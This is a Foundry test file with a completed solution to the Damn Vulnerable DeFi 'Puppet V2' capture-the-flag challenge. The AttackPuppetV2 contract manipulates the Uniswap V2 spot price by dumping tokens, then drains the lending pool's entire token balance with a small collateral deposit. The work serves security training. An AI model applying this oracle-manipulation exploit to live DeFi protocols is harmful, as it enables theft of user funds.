// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";

contract PuppetV2Challenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapV2Exchange;
    PuppetV2Pool lendingPool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Factory.json"), abi.encode(address(0)))
        );
        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV2Router02.json"),
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Create Uniswap pair against WETH and add liquidity
        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}({
            token: address(token),
            amountTokenDesired: UNISWAP_INITIAL_TOKEN_RESERVE,
            amountTokenMin: 0,
            amountETHMin: 0,
            to: deployer,
            deadline: block.timestamp * 2
        });
        uniswapV2Exchange = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        // Deploy the lending pool
        lendingPool =
            new PuppetV2Pool(address(weth), address(token), address(uniswapV2Exchange), address(uniswapV2Factory));

        // Setup initial token balances of pool and player accounts
        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(token.balanceOf(player), PLAYER_INITIAL_TOKEN_BALANCE);
        assertEq(token.balanceOf(address(lendingPool)), POOL_INITIAL_TOKEN_BALANCE);
        assertGt(uniswapV2Exchange.balanceOf(deployer), 0);

        // Check pool's been correctly setup
        assertEq(lendingPool.calculateDepositOfWETHRequired(1 ether), 0.3 ether);
        assertEq(lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE), 300000 ether);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_puppetV2() public checkSolvedByPlayer {
        /*
            The attack idea is the same as the previous challenge, but this time we need to use the UniswapV2Router02
        */


        // Deploy the attack contract with the player's initial balance (token and eth)
        AttackPuppetV2 attackContract = new AttackPuppetV2{value: PLAYER_INITIAL_ETH_BALANCE}(
            token, lendingPool, recovery, uniswapV2Router, uniswapV2Exchange, weth
        );
        token.transfer(address(attackContract), PLAYER_INITIAL_TOKEN_BALANCE);
        attackContract.attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
        assertEq(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

contract AttackPuppetV2 {
    DamnValuableToken public token;
    PuppetV2Pool public pool;
    address public recovery;
    IUniswapV2Router02 public uniswapV2Router;
    IUniswapV2Pair uniswapV2Exchange;
    WETH weth;

    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    constructor(
        DamnValuableToken _token,
        PuppetV2Pool _pool,
        address _recovery,
        IUniswapV2Router02 _uniswapV2Router,
        IUniswapV2Pair _uniswapV2Exchange,
        WETH _weth
    ) payable {
        token = _token;
        pool = _pool;
        recovery = _recovery;
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Exchange = _uniswapV2Exchange;
        weth = _weth;
    }

    function attack() public {
        // We need to make a swap that will dump the price of the token in the uniswapV2Exchange
        // We are going to use the Router to swap WETH for the token

        // First we need to approve the Router to spend the token
        token.approve(address(uniswapV2Router), type(uint256).max);

        // make the swap token -> WETH
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(uniswapV2Router.WETH());
        uniswapV2Router.swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE, 1, path, address(this), block.timestamp);

        // Uniswap v2 pair will have a lot of DVT and very little WETH => price of DVT will drop
        // Lets see the reserves
        (uint256 reservesWETH, uint256 reservesToken,) = uniswapV2Exchange.getReserves();
        console.log("Reserves WETH: %d", reservesWETH); // 99304865938430984 = 0.099304865938430984 ether
        console.log("Reserves Token: %d", reservesToken); // 10100000000000000000000 = 10100 token

        // Now we can borrow the token from the pool
        // First let see how much WETH we need to deposit to borrow all the tokens from the pool
        uint256 amount = pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        console.log("Amount of WETH to deposit: %d", amount);
        // 29496494833197321980 wei = 29.496494833197321980 ether

        // let see how much ether we have
        console.log("Balance: %d", address(this).balance); // 29900695134061569016 wei = 29.900695134061569016 ether

        // We have enough ether to deposit

        // Deposit the WETH and borrow the tokens
        // First we need to change the eth to WETH
        weth.deposit{value: address(this).balance}();
        // approve the pool to spend the WETH
        weth.approve(address(pool), type(uint256).max);
        pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
        // send the tokens to the recovery account
        token.transfer(recovery, token.balanceOf(address(this)));
    }

    receive() external payable {}
}
